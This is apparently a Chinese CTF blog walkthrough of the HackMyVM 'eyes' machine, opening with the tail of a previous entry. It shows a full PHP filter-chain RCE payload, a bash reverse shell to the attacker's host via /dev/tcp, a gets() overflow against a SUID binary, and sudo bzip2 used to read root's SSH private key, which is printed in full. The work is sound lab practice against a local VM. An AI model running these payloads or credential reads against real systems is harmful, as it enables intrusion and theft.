cris@crack:~$ <span class="token function">ssh</span> <span class="token parameter variable">-i</span> ssh.txt root@localhost
The authenticity of <span class="token function">host</span> <span class="token string">'localhost (127.0.0.1)'</span> can<span class="token string">'t be established.
ECDSA key fingerprint is SHA256:7z5F9pr6GN7gcEMbKUwipxWswKEpR9bMKOVzGc0V7/s.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span>localhost' <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span> to the list of known hosts.
Linux crack <span class="token number">5.10</span>.0-23-amd64 <span class="token comment">#1 SMP Debian 5.10.179-1 (2023-05-12) x86_64</span>

The programs included with the Debian GNU/Linux system are <span class="token function">free</span> software<span class="token punctuation">;</span>
the exact distribution terms <span class="token keyword">for</span> each program are described <span class="token keyword">in</span> the
individual files <span class="token keyword">in</span> /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jun  <span class="token number">7</span> <span class="token number">22</span>:11:49 <span class="token number">2023</span>
root@crack:~<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
<p>成功root</p>
]]></content>
      <categories>
        <category>HackMyVM</category>
      </categories>
      <tags>
        <tag>dirb</tag>
      </tags>
  </entry>
  <entry>
    <title>HackMyVM-eyes</title>
    <url>/posts/6b328076/</url>
    <content><![CDATA[<p><strong>难度:medium</strong></p>
<p><strong>kali:192.168.56.104</strong></p>
<p><strong>靶机:192.168.56.186</strong></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> arp-scan <span class="token parameter variable">-l</span>
Interface: eth0, type: EN10MB, MAC: 00:0c:29:d2:e0:49, IPv4: <span class="token number">192.168</span>.56.104
Starting arp-scan <span class="token number">1.10</span>.0 with <span class="token number">256</span> hosts <span class="token punctuation">(</span>https://github.com/royhills/arp-scan<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.1    0a:00:27:00:00:05       <span class="token punctuation">(</span>Unknown: locally administered<span class="token punctuation">)</span>
<span class="token number">192.168</span>.56.100  08:00:27:5a:20:59       PCS Systemtechnik GmbH
<span class="token number">192.168</span>.56.186  08:00:27:22:46:7a       PCS Systemtechnik GmbH

<span class="token number">3</span> packets received by filter, <span class="token number">0</span> packets dropped by kernel
Ending arp-scan <span class="token number">1.10</span>.0: <span class="token number">256</span> hosts scanned <span class="token keyword">in</span> <span class="token number">1.928</span> seconds <span class="token punctuation">(</span><span class="token number">132.78</span> hosts/sec<span class="token punctuation">)</span>. <span class="token number">3</span> responded</code></pre>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> nmap <span class="token number">192.168</span>.56.186 <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span>
Starting Nmap <span class="token number">7</span>.94SVN <span class="token punctuation">(</span> https://nmap.org <span class="token punctuation">)</span> at <span class="token number">2024</span>-06-21 <span class="token number">22</span>:30 CST
Nmap scan report <span class="token keyword">for</span> <span class="token number">192.168</span>.56.186
Host is up <span class="token punctuation">(</span><span class="token number">0</span>.00032s latency<span class="token punctuation">)</span>.
Not shown: <span class="token number">997</span> closed tcp ports <span class="token punctuation">(</span>reset<span class="token punctuation">)</span>
PORT   STATE SERVICE VERSION
<span class="token number">21</span>/tcp <span class="token function">open</span>  <span class="token function">ftp</span>     vsftpd <span class="token number">3.0</span>.3
<span class="token operator">|</span> ftp-anon: Anonymous FTP login allowed <span class="token punctuation">(</span>FTP code <span class="token number">230</span><span class="token punctuation">)</span>
<span class="token operator">|</span>_-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">125</span> Apr 04  <span class="token number">2021</span> index.php
<span class="token operator">|</span> ftp-syst: 
<span class="token operator">|</span>   STAT: 
<span class="token operator">|</span> FTP server status:
<span class="token operator">|</span>      Connected to ::ffff:192.168.56.104
<span class="token operator">|</span>      Logged <span class="token keyword">in</span> as <span class="token function">ftp</span>
<span class="token operator">|</span>      TYPE: ASCII
<span class="token operator">|</span>      No session bandwidth limit
<span class="token operator">|</span>      Session <span class="token function">timeout</span> <span class="token keyword">in</span> seconds is <span class="token number">300</span>
<span class="token operator">|</span>      Control connection is plain text
<span class="token operator">|</span>      Data connections will be plain text
<span class="token operator">|</span>      At session startup, client count was <span class="token number">1</span>
<span class="token operator">|</span>      vsFTPd <span class="token number">3.0</span>.3 - secure, fast, stable
<span class="token operator">|</span>_End of status
<span class="token number">22</span>/tcp <span class="token function">open</span>  <span class="token function">ssh</span>     OpenSSH <span class="token number">7</span>.9p1 Debian <span class="token number">10</span>+deb10u2 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>
<span class="token operator">|</span> ssh-hostkey: 
<span class="token operator">|</span>   <span class="token number">2048</span> b1:12:94:12:60:67:e1:0b:45:c1:8d:e9:21:13:bc:51 <span class="token punctuation">(</span>RSA<span class="token punctuation">)</span>
<span class="token operator">|</span>   <span class="token number">256</span> b7:7f:25:94:d6:4e:88:56:8a:22:34:16:c2:de:ba:02 <span class="token punctuation">(</span>ECDSA<span class="token punctuation">)</span>
<span class="token operator">|</span>_  <span class="token number">256</span> <span class="token number">30</span>:c7:a2:90:39:5d:24:13:bf:aa:ba:4c:a7:f4:2f:bb <span class="token punctuation">(</span>ED25519<span class="token punctuation">)</span>
<span class="token number">80</span>/tcp <span class="token function">open</span>  http    nginx <span class="token number">1.14</span>.2
<span class="token operator">|</span>_http-server-header: nginx/1.14.2
<span class="token operator">|</span>_http-title: Site doesn't have a title <span class="token punctuation">(</span>text/html<span class="token punctuation">;</span> <span class="token assign-left variable">charset</span><span class="token operator">=</span>UTF-8<span class="token punctuation">)</span>.
MAC Address: 08:00:27:22:46:7A <span class="token punctuation">(</span>Oracle VirtualBox virtual NIC<span class="token punctuation">)</span>
Device type: general purpose
Running: Linux <span class="token number">4</span>.X<span class="token operator">|</span><span class="token number">5</span>.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux <span class="token number">4.15</span> - <span class="token number">5.8</span>
Network Distance: <span class="token number">1</span> hop
Service Info: OSs: Unix, Linux<span class="token punctuation">;</span> CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
<span class="token number">1</span>   <span class="token number">0.31</span> ms <span class="token number">192.168</span>.56.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="token builtin class-name">.</span>
Nmap done: <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">8.42</span> seconds</code></pre>
<h2 id="ftp-anonymou-login"><a href="#ftp-anonymou-login" class="headerlink" title="ftp anonymou login"></a>ftp anonymou login</h2><pre class="language-bash" data-language="bash"><code class="language-bash">ftp<span class="token operator">></span> <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">52717</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Here comes the directory listing.
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">113</span>          <span class="token number">4096</span> Apr 04  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x    <span class="token number">2</span> <span class="token number">0</span>        <span class="token number">113</span>          <span class="token number">4096</span> Apr 04  <span class="token number">2021</span> <span class="token punctuation">..</span>
-rw-r--r--    <span class="token number">1</span> <span class="token number">0</span>        <span class="token number">0</span>             <span class="token number">125</span> Apr 04  <span class="token number">2021</span> index.php
<span class="token number">226</span> Directory send OK.
ftp<span class="token operator">></span> get index.php
local: index.php remote: index.php
<span class="token number">229</span> Entering Extended Passive Mode <span class="token punctuation">(</span><span class="token operator">||</span><span class="token operator">|</span><span class="token number">27986</span><span class="token operator">|</span><span class="token punctuation">)</span>
<span class="token number">150</span> Opening BINARY mode data connection <span class="token keyword">for</span> index.php <span class="token punctuation">(</span><span class="token number">125</span> bytes<span class="token punctuation">)</span>.
<span class="token number">100</span>% <span class="token operator">|</span>***********************************************************************************************************************************************************************************************<span class="token operator">|</span>   <span class="token number">125</span>       <span class="token number">32.14</span> KiB/s    00:00 ETA
<span class="token number">226</span> Transfer complete.
<span class="token number">125</span> bytes received <span class="token keyword">in</span> 00:00 <span class="token punctuation">(</span><span class="token number">27.94</span> KiB/s<span class="token punctuation">)</span></code></pre>
<p>拿到index.php</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">cat</span> index.php 
<span class="token operator">&lt;</span>?php
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'fil3'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
if<span class="token punctuation">(</span>isset<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">))</span>
<span class="token punctuation">&#123;</span>
include<span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span>
<span class="token punctuation">&#123;</span>
print<span class="token punctuation">(</span><span class="token string">"Here my eyes..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
?<span class="token operator">></span>
<span class="token operator">&lt;</span><span class="token operator">!</span>--Monica's eyes--<span class="token operator">></span></code></pre>
<p>妥妥的文件包含,去80端口看一下</p>
<h2 id="web-信息搜集"><a href="#web-信息搜集" class="headerlink" title="web 信息搜集"></a>web 信息搜集</h2><p><img src="https://ooo.0x0.ooo/2024/06/21/OPksh6.png" alt="OPksh6.png" loading="lazy"><br>跟刚才获取的index.php内容一样，尝试文件包含<br><img src="https://ooo.0x0.ooo/2024/06/21/OPkVtP.png" alt="OPkVtP.png" loading="lazy"><br>这里思路就比较多了，可以nginx日志写马也可以尝试filter链，我觉得日志麻烦就直接用filter链了,直接把以前打靶的payload拿来用</p>
<pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.56.186&#x2F;?fil3&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.%2569conv.UTF8.CSISO2022KR|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM921.NAPLPS|convert.%2569conv.855.CP936|convert.%2569conv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.IBM869.UTF16|convert.%2569conv.L3.CSISO90|convert.%2569conv.UCS2.UTF-8|convert.%2569conv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.8859_3.UTF16|convert.%2569conv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.865.UTF16|convert.%2569conv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP861.UTF-16|convert.%2569conv.L4.GB13000|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.UTF16LE|convert.%2569conv.UTF8.CSISO2022KR|convert.%2569conv.UCS2.UTF8|convert.%2569conv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.PT.UTF32|convert.%2569conv.KOI8-U.IBM-932|convert.%2569conv.SJIS.EUCJP-WIN|convert.%2569conv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CP367.UTF-16|convert.%2569conv.CSIBM901.SHIFT_JISX0213|convert.%2569conv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.CSIBM1161.UNICODE|convert.%2569conv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.ISO2022KR.UTF16|convert.%2569conv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.INIS.UTF16|convert.%2569conv.CSIBM1133.IBM943|convert.%2569conv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.%2569conv.SE2.UTF-16|convert.%2569conv.CSIBM1161.IBM-932|convert.%2569conv.MS932.MS936|convert.%2569conv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.%2569conv.UTF8.UTF7|convert.base64-decode&#x2F;resource&#x3D;php:&#x2F;&#x2F;temp&amp;0&#x3D;id</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/21/OPkY2b.png" alt="OPkY2b.png" loading="lazy"><br>可以看到是成功rce了，反弹个shell</p>
<pre class="language-none"><code class="language-none">&amp;0&#x3D;bash%20-c%20&#39;bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.56.104%2F4567%20%200%3E%261&#39;</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>             
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.186<span class="token punctuation">]</span> <span class="token number">58326</span>
bash: cannot <span class="token builtin class-name">set</span> terminal process group <span class="token punctuation">(</span><span class="token number">316</span><span class="token punctuation">)</span>: Inappropriate ioctl <span class="token keyword">for</span> device
bash: no job control <span class="token keyword">in</span> this shell
www-data@eyes:~/html$ </code></pre>
<p>成功getshell</p>
<h2 id="提权user"><a href="#提权user" class="headerlink" title="提权user"></a>提权user</h2><pre class="language-bash" data-language="bash"><code class="language-bash">www-data@eyes:/home$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">12</span>
drwxr-xr-x  <span class="token number">3</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">18</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
drwxr-xr-x  <span class="token number">3</span> monica monica <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> monica
www-data@eyes:/home$ <span class="token builtin class-name">cd</span> monica  
<span class="token builtin class-name">cd</span> monica
www-data@eyes:/home/monica$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
<span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">36</span>
drwxr-xr-x <span class="token number">3</span> monica monica <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">3</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> <span class="token punctuation">..</span>
-rw------- <span class="token number">1</span> monica monica   <span class="token number">50</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> .Xauthority
-rw-r--r-- <span class="token number">1</span> monica monica  <span class="token number">220</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> monica monica <span class="token number">3526</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> .bashrc
drwxr-xr-x <span class="token number">3</span> monica monica <span class="token number">4096</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> .local
-rw-r--r-- <span class="token number">1</span> monica monica  <span class="token number">807</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> .profile
-rwx--x--x <span class="token number">1</span> monica monica <span class="token number">1920</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> flag.sh
-rw------- <span class="token number">1</span> monica monica   <span class="token number">12</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> user.txt
www-data@eyes:/home/monica$ <span class="token function">cat</span> us*     
<span class="token function">cat</span> us*
cat: user.txt: Permission denied</code></pre>
<p>只有一个用户monica，但是没有权限读user flag，注意到有个flag.sh 711的权限<br>没有权限读，但是有权限执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@eyes:/home/monica$ ./flag.sh
/bin/bash: ./flag.sh: Permission denied</code></pre>
<p>好吧并不能执行<br>sudo看一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@eyes:/tmp$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>

We trust you have received the usual lecture from the <span class="token builtin class-name">local</span> System
Administrator. It usually boils down to these three things:

    <span class="token comment">#1) Respect the privacy of others.</span>
    <span class="token comment">#2) Think before you type.</span>
    <span class="token comment">#3) With great power comes great responsibility.</span>

<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> www-data: </code></pre>
<p>无<br>看一手suid</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@eyes:/tmp$ <span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-ls</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
     <span class="token number">1501</span>     <span class="token number">20</span> -rwsr-sr-x   <span class="token number">1</span> root     root        <span class="token number">16864</span> Apr  <span class="token number">4</span>  <span class="token number">2021</span> /opt/ls
   <span class="token number">268126</span>     <span class="token number">12</span> -rwsr-xr-x   <span class="token number">1</span> root     root        <span class="token number">10232</span> Mar <span class="token number">28</span>  <span class="token number">2017</span> /usr/lib/eject/dmcrypt-get-device
   <span class="token number">135697</span>     <span class="token number">52</span> -rwsr-xr--   <span class="token number">1</span> root     messagebus    <span class="token number">51184</span> Jul  <span class="token number">5</span>  <span class="token number">2020</span> /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   <span class="token number">146938</span>    <span class="token number">428</span> -rwsr-xr-x   <span class="token number">1</span> root     root         <span class="token number">436552</span> Jan <span class="token number">31</span>  <span class="token number">2020</span> /usr/lib/openssh/ssh-keysign
   <span class="token number">131120</span>     <span class="token number">84</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">84016</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/gpasswd
   <span class="token number">154444</span>    <span class="token number">156</span> -rwsr-xr-x   <span class="token number">1</span> root     root         <span class="token number">157192</span> Jan <span class="token number">20</span>  <span class="token number">2021</span> /usr/bin/sudo
   <span class="token number">134620</span>     <span class="token number">64</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">63568</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/su
   <span class="token number">134946</span>     <span class="token number">52</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">51280</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/mount
   <span class="token number">131121</span>     <span class="token number">64</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">63736</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/passwd
   <span class="token number">134473</span>     <span class="token number">44</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">44440</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/newgrp
   <span class="token number">131117</span>     <span class="token number">56</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">54096</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/chfn
   <span class="token number">134948</span>     <span class="token number">36</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">34888</span> Jan <span class="token number">10</span>  <span class="token number">2019</span> /usr/bin/umount
   <span class="token number">131118</span>     <span class="token number">44</span> -rwsr-xr-x   <span class="token number">1</span> root     root          <span class="token number">44528</span> Jul <span class="token number">27</span>  <span class="token number">2018</span> /usr/bin/chsh</code></pre>
<p>有个ls,去opt目录看一下</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">www-data@eyes:/opt$ <span class="token function">cat</span> note.txt
Im preparing the new <span class="token function">ls</span> program.
<span class="token parameter variable">-monica</span>
www-data@eyes:/opt$ <span class="token function">cat</span> ls.c
<span class="token comment">#include &lt;stdlib.h></span>
<span class="token comment">#include &lt;unistd.h></span>
<span class="token comment">#include &lt;stdio.h></span>
<span class="token comment">#include &lt;string.h></span>
<span class="token comment">#include &lt;sys/types.h></span>

int main<span class="token punctuation">(</span>void<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
 char command<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 char ls<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string">"/usr/bin/ls"</span><span class="token punctuation">;</span>
 char name<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
 printf<span class="token punctuation">(</span><span class="token string">"Enter your name:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 gets<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
 strcpy<span class="token punctuation">(</span>command,ls<span class="token punctuation">)</span><span class="token punctuation">;</span>
 setuid<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 setgid<span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 printf<span class="token punctuation">(</span><span class="token string">"Hi %s, Im executing ls<span class="token entity" title="\n">\n</span> Output:<span class="token entity" title="\n">\n</span>"</span>,name<span class="token punctuation">)</span><span class="token punctuation">;</span>
 system<span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>
<p>作者写了一个新的ls命令，输入一个姓名，将ls命令路径赋值到command里面，将进程的用户ID和组ID设置为1000，然后用system执行ls命令<br>一眼就能看出来gets会造成溢出，但是我不知道几个字符能溢出，就试了几下,成功执行命令<br><img src="https://ooo.0x0.ooo/2024/06/21/OPkw2L.png" alt="OPkw2L.png" loading="lazy"></p>
<pre class="language-none"><code class="language-none">www-data@eyes:&#x2F;opt$ .&#x2F;ls 
Enter your name:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabash

Hi aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabash, Im executing ls
 Output:
monica@eyes:&#x2F;opt$ </code></pre>
<p>拿到monica的shell</p>
<h2 id="提权root"><a href="#提权root" class="headerlink" title="提权root"></a>提权root</h2><pre class="language-bash" data-language="bash"><code class="language-bash">monica@eyes:/opt$ <span class="token function">sudo</span> <span class="token parameter variable">-l</span>
Matching Defaults entries <span class="token keyword">for</span> monica on eyes:
    env_reset, mail_badpass,
    <span class="token assign-left variable">secure_path</span><span class="token operator">=</span>/usr/local/sbin<span class="token punctuation">\</span>:/usr/local/bin<span class="token punctuation">\</span>:/usr/sbin<span class="token punctuation">\</span>:/usr/bin<span class="token punctuation">\</span>:/sbin<span class="token punctuation">\</span>:/bin

User monica may run the following commands on eyes:
    <span class="token punctuation">(</span>ALL<span class="token punctuation">)</span> NOPASSWD: /usr/bin/bzip2</code></pre>
<p>可以bz2读取文件,看看能不能拿到root的私钥</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">monica@eyes:/opt$ <span class="token assign-left variable">LFILE</span><span class="token operator">=</span>/root/.ssh/id_rsa        
monica@eyes:/opt$ <span class="token function">sudo</span> <span class="token function">bzip2</span> <span class="token parameter variable">-c</span> <span class="token variable">$LFILE</span> <span class="token operator">|</span> <span class="token function">bzip2</span> <span class="token parameter variable">-d</span>
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEArFKlwNcXIsZLyj2E4waArCaGEOYVJxX50k4mF81nzPtiIgX+32e9
sMfZd6oDpovRq2hEE8TKqdfHogyvpVHV2wBs/BLOAajO63GnFX8dAoBi/yzhnyYXgrNE9b
Cs5D6itQVBxC1EINy1TS67T14+jqK+9UNWdfQC8VlENBeaVbYI3vUSxQCbRqs92nQLrSVM
hYOa0zhYdWlkCH46aprZi1OTe4ZvSfuzYU3+tmhonwiYMyeAYCSEsnkCeUTF4zke9kRovP
upbKiPWoYHEKXPWYCDJ9xOD/K1yMsK8YJ2rOqyr5TkyO5HdEGZxj8MFMTFLyeyFG2kUHYy
llW2WQoqZQAAA8DTPxkj0z8ZIwAAAAdzc2gtcnNhAAABAQCsUqXA1xcixkvKPYTjBoCsJo
YQ5hUnFfnSTiYXzWfM+2IiBf7fZ72wx9l3qgOmi9GraEQTxMqp18eiDK+lUdXbAGz8Es4B
qM7rcacVfx0CgGL/LOGfJheCs0T1sKzkPqK1BUHELUQg3LVNLrtPXj6Oor71Q1Z19ALxWU
Q0F5pVtgje9RLFAJtGqz3adAutJUyFg5rTOFh1aWQIfjpqmtmLU5N7hm9J+7NhTf62aGif
CJgzJ4BgJISyeQJ5RMXjOR72RGi8+6lsqI9ahgcQpc9ZgIMn3E4P8rXIywrxgnas6rKvlO
TI7kd0QZnGPwwUxMUvJ7IUbaRQdjKWVbZZCiplAAAAAwEAAQAAAQEAgq5ajReQsAp5R3HH
6PLxeZvtZ7tUp0N/JQGm2b4nzceF8A9j7cAalom4XYtNIWw/ISH9HpDKsGq3NikwusqIx4
BXJgKMv61o3hxefWrccR0z9hfvMmYMxk11Km1FcAIgGe9WpJM/azx1MYcS/WmXP0wkTJM4
alMWODleA7Myk3QuG/jwVEZE37xaJHPwTpv9VRbqIjqw9XQbGvArzyuAsGWtMMMpZ3zwx5
LuthcWa2B0u4ND+KCi6vk/phwtoHJL26FiCFHdNUda7UgssdBQ0jby/0wdHK4BvwooZS6v
23Ly1Lw37prz8GN8S504Xa5zKG0St1Xb+rT77lRDOsfTgQAAAIEAjbYIgPvhTt3ZS+ne8R
iDgwrIOZIKCwb+s5o5F0vH0c/++s+weAghl+Fn8QfgCAMHapEZmyKjvLbixUT2B8F765S4
6omR8PD3i0Rr0j+pbBz9jNga/+XJjctLF+atU3aG0tB1Nc5Z/+eGtHjL1UJPNRaHtyb3zt
gOvMAN/5ZR8sMAAACBANl6TrhqiJaQcOdOT05Y4FxSh4r4ng2TTd5k1B9d2lSIVKeviKtj
L4QDlT/uzE6Rf0bNgunP+qT5YjB4ag/17sm7GDzSd+8MDnkeRTDEtHjPwLEHUYDyNl0/wS
9B+rlHu84WMYexmltA30PjAUQXaztYcKortlBHF8PRqHcatJaJAAAAgQDK2MGRmyabimXN
Ursppl+JsMn/xvaUj6AvlTmdyH7rGmjwa4s9OP503AX59/pRyyhGOuPyaiWR8kNp5YOkH0
Zv8bGSSWUP3b7ScjgCMVaXXVmEgG+feZyf1swM2WwQVZzs152wZcrK3hFG/vIFlFwcDD3y
pN2NMCkY0EFGqmz9/QAAAAlyb290QGV5ZXM<span class="token operator">=</span>
